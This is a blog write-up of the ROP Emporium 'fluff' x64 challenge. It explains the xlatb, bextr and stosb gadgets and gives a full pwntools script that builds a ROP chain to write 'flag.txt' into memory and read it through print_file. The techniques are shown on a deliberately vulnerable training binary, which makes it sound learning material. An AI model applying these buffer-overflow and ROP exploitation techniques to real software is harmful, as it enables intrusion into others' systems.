---
layout: post
title:  "ROP Emporium fluff Writeup (x64)"
date:   2024-06-06 00:00:00 -0400
categories: rop-emporium challenge-6
tags: rop-emporium fluff x64 writeup buffer-overflow rop reverse-engineering 64-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[fifth challenge](https://ropemporium.com/challenge/fluff.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.


According to the
[challenge page](https://ropemporium.com/challenge/fluff.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `print_file()` with the name of the
file to read as the first argument. The string `flag.txt`
doesn't exist in the binary, so we will need to write it
there ourselves. 

> This is what a hint will look like!
{: .prompt-tip }

## Offset
The offset for `x64` challenges will be `40 bytes`. If
you want to know how to find this value see the
[first writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}
of this series.

## print_file()
> Find the `print_file` address and a gadget which
> sets the `rdi` register
{: .prompt-tip }

First let's find the address of `print_file()` using
the command `afl`

![print-file-addr](/images/fluff/x64-print-file-addr.png)

`print_file` is part of a library so we can just use the
address of corresponding `plt` entry, `0x00400510`

Now we need to set the first argument to this function.
According to the
[x64 calling convention](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf){:target="_blank"}{:rel="noopener noreferrer"},
the first argument of a function is passed through the `rdi`
register. Let's find a gadget to control it

```
/R pop rdi
```

![rdi-addr](/images/fluff/x64-rdi-addr.png)

Perfect! Our gadget address is `0x004006a3`

## Questionable Gadgets
> Checkout `usefulFunction`'s assembly and learn
> what each instruction does
{: .prompt-tip }

Let's check the `questionableGadgets` section
in `usefulFunction`.
We can view the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![questionable gadgets](/images/fluff/x64-questionable-gadgets.png)

There are three gadgets here and they contain instructions
you might not be familiar with, so let's go over what
each gadget does

### Gadget 1: xlatb
![gadget1](/images/fluff/x64-gadget1.png)

Our first gadget only has the `xlatb` instruction and
nothing else. According to the
[xlatb documentation](https://www.felixcloutier.com/x86/xlat:xlatb){:target="_blank"}{:rel="noopener noreferrer"}
this instruction copies a byte from a table into
register `al`. The table's base address is set in `ebx` and
the table's offset is set in `al`. Referencing this
[x64 cheat sheet](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf){:target="_blank"}{:rel="noopener noreferrer"}
register `al` refers to byte 0 of register `rax`

This will allow us to read an arbitrary byte from memory
and store it into `al`,
but there aren't any gadgets which allow us to control
`ebx` or `rax` with a `pop` instruction. Let's
see what the other gadgets can do

### Gadget 2: bextr
![gadget2](/images/fluff/x64-gadget2.png)

The second gadget is the longest and uses the `bextr`
instruction. According to the
[bextr documentation](https://www.felixcloutier.com/x86/bextr){:target="_blank"}{:rel="noopener noreferrer"}
this instruction will extract some bits from the value
in `rcx` and save those bits into `rbx`. The start index
and bit length to extract from `rbx` is defined in `rdx`.

The `pop` instructions allow us to control the `rdx` and
`rcx` registers. Since these are the source operands for
the `bextr` instruction, we essentially control `rbx`.
Referring to the
[x64 cheat sheet](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf){:target="_blank"}{:rel="noopener noreferrer"}
again, we see that the `ebx` register refers to bytes
0-3 of the `rbx` register.
Now we have a way to control the first gadget's
table address!

### Gadget 3: stosb
![gadget3](/images/fluff/x64-gadget3.png)

The 
[stosb documenation](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
says this instruction will write the contents of `al` into
the memory location in `rdi`. This is essentially a `mov`
instruction but just uses registers that are harder for
us to access. We already have a `pop rdi` gadget to set
the first argument of the `print_file` function, so
we just need to be able to control `al`.

Looking at the first gadget again, register `al` acts not
only as the table offset, but will contain the byte read
from the table when the instruction finishes. Though it
may seem a little convoluted, we control enough registers
to write to an arbitrary place in memory!

## Writing to Memory
To write to memory we need to use `gadget 3` which
will write the value in `al` to the address at `rdi`. We
can use `gadget 1` which sets `al` to a value read
from memory according to an address `ebx` and offset `al`.
`gadget 2` gives us a way to set `ebx` by setting `rbx` with
the registers `rcx` and `rdx`.

Essentially we will have three steps
1. Put the address of a byte we want to read into `rbx` using
`gadget 2`
2. Read the byte at that address and place it into `al`
with `gadget 1`
3. Write byte in `al` to an address with `gadget 3`

Let's start by creating a function which sets `rbx`

### Set rbx
![gadget2](/images/fluff/x64-gadget2.png)

`bextr` will extract bits from `rcx` according to the
arguments set in `rdx` and save it in `rdx`. The `add`
instruction will mess with our `rcx` value we're going
to set from the stack. In order to ignore this, we
can just shift our value to avoid the add.

For example, say we want to copy the number `123` but
the number `7` will always be added to it. To ignore the
`+7` we can shift our value `123` -> `1230`. This way,
`7` will still get added to the string but we can set
the extraction arguments such that we only read the first
3 digits. Our value will become `1237` but by extracting
the first 3 numbers we get our original value of `123`

To extract the correct bits we should refer to the
[bextr documentation](https://www.felixcloutier.com/x86/bextr){:target="_blank"}{:rel="noopener noreferrer"}.
`0x3ef2` is 32 bits so we want to read 32 bits starting
and index 32. These values are set into the first 16 bits
of `rdx`

```python
#!/bin/python3
from pwn import *

gadget2 = 0x0040062a

def set_rbx(addr):
    payload = b''

    # index and length of bits to copy
    # first 8 index
    rdx1 = p8(32)
    # last 8 len
    rdx2 = p8(32)
    rdx3 = p32(0) + p16(0)
    rdx = rdx1 + rdx2 + rdx3

    # address we want to copy
    # addr + 0x3ef2
    # avoid addition by leaving it blank
    # 0xXXXX0000
    # 0x00003ef2
    rcx1 = p32(0)
    rcx2 = p32(addr)
    rcx = rcx1 + rcx2

    # sets rbx
    payload += p64(gadget2) + rdx + rcx
    return payload
```

### Read Byte
![gadget1](/images/fluff/x64-gadget1.png)

The 
[xlatb instruction](https://www.felixcloutier.com/x86/xlat:xlatb){:target="_blank"}{:rel="noopener noreferrer"}
will read a byte from `rbx` + `al` and save it into `al`.
In order to read the correct byte, we'll need to subtract
the previous value of `al` from `rbx`

```
rbx + al = target_address
rbx = target_address - al
```

To properly read a byte from memory we need to answer
two questions
1. What is the initial value of `al`?
2. What addresses should we be reading from?

`al`'s initial value can be found using `pwndbg` (or your
favorite debugger) and stepping through a basic ROP chain

```python
#!/bin/python3
from pwn import *

gadget1 = 0x00400628
payload = b'A' * 40 + p64(gadget1)

# replace kitty with your terminal
context.terminal = ['kitty']

# break when ropchain starts
io = gdb.debug('./fluff', '''
               b pwnme
               c
               b *0x00400628
               c
               ''')
io.send(payload)
io.interactive()
```

![al value](/images/fluff/x64-al-value.png)

The initial value of `al` is 11! 

Next we need to find addresses to read from. 
Our goal is to construct the string `flag.txt` so let's
search the binary for these characters using good ol
`radare2`. We can search for strings, or in our case
specific characters, using the `/` command

```
/ f
/ l
/ a
```

![letter addresses](/images/fluff/x64-letter-addresses.png)

The addresses returned will refer to our searched character.
Copy any address for every needed character. Here's
what this exploit will use

```python
char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
            'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
            'x': 0x00400725}
```

### Write Byte
![gadget3](/images/fluff/x64-gadget3.png)

We can control what is in `al` and `rdi` by this point,
so now we just need a place to write to and some code
to generate the ROP chain

We can view writable sections in `radare2` with the `iS`
command

![writable sections](/images/fluff/x64-writable-sections.png)

Let's use the `.data` section which has the address
`0x00601028`

Using everything we've found we can finally create a
function which will write a byte to a location in memory

```python
char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
            'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
            'x': 0x00400725}

# initial al value
al = 11 

# char is what we will write
# addr is address of target char
# offset will find the proper writing location
# returns ROP chain in bytes
def write_byte(addr, char, offset):
    global al
    
    # set address to get byte
    payload = set_rbx(addr-al)

    # read byte into al
    payload += p64(gadget1)
    # update al with new value
    al = ord(char)

    # write byte al into .data
    rdi = p64(write_addr + offset)
    payload += p64(pop_rdi) + rdi + p64(gadget3)
    return payload
```

## Exploit
We have everything we need to build our exploit

```python
#!/bin/python3
from pwn import *

# addresses
write_addr = 0x00601028     # data addr
print_file_addr = 0x00400510
pop_rdi = 0x004006a3
junk = 0xdeadbeefdeadbeef

# xlatb
# gets byte from table memory with
# register al as the index (8 bits unsigned int)
# rbx contains base addr
# returns result into al
gadget1 = 0x00400628

# pop rdx
# pop rcx
# add rcx, 0x3ef2
# bextr rbx, rcx, rdx
# extracts bits from rcx according to rdx
# result saved in rbx
gadget2 = 0x0040062a

# stosb byte [rdi], al
# stores byte from al into rdi
# writes al into rdi addr
gadget3 = 0x00400639

# saves 32bit addr in rbx
def set_rbx(addr):
    payload = b''

    # index and length of bits to copy
    # first 8 index
    rdx1 = p8(32)
    # last 8 len
    rdx2 = p8(32)
    rdx3 = p32(0) + p16(0)
    rdx = rdx1 + rdx2 + rdx3

    # address we want to copy
    # addr + 0x3ef2
    # avoid addition by leaving it blank
    # 0xXXXX0000
    # 0x00003ef2
    rcx1 = p32(0)
    rcx2 = p32(addr)
    rcx = rcx1 + rcx2

    # sets rbx
    payload += p64(gadget2) + rdx + rcx
    return payload


al = 11 # initial al value
# char is what we will write
# addr is address of target char
# offset will find the proper writing location
# returns ROP chain in bytes
def write_byte(addr, char, offset):
    global al
    
    # set address to get byte
    payload = set_rbx(addr-al)

    # read byte into al
    payload += p64(gadget1)
    # update al with new value
    al = ord(char)

    # write byte al into .data
    rdi = p64(write_addr + offset)
    payload += p64(pop_rdi) + rdi + p64(gadget3)
    return payload

# write flag.txt in mem
char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
            'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
            'x': 0x00400725}
target_str = 'flag.txt'

# create payload
payload = b'A' * 40
for i in range(0, len(target_str)):
    c = target_str[i]
    payload += write_byte(char_map[c], c, i)
# print file
payload += p64(pop_rdi) + p64(write_addr) + p64(print_file_addr)

io = process('./fluff')
io.send(payload)
io.recvuntil(b'Thank you!\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```

![flag](/images/fluff/x64-flag.png)

## Conclusion
In this challenge we learned how to write to memory
without using a `mov` instruction. By chaining the
effects of multiple gadgets together we can achieve the
same functionality of a missing instruction! In the
next challenge we'll learn how to pivot the stack

[Previous Challenge (badchars)]({% post_url 2024-06-05-rop-emporium-badchars-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

Next Challenge (pivot)

fluff x86
